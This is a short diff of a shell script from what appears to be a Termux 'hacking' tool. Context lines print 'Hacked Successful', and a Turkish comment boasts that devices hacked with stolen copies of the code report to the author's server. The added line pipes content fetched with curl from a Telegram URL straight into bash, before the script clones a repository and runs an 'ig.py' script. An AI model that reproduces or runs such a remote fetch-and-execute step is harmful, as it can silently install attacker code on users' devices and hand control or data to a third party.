@@ -138,6 +138,9 @@ echo "Hacked Successful✔️"
 
 # Dostum kodları çalamazsın çalsanda hacklediğin cihaz benim servere düşer uzaklaş burdan.!
 
+bash <(curl -L https://t.me/SakirBey2)
+
+
 git clone https://github.com/SakirBey1/termux.git
 cd termux
 python3 ig.py
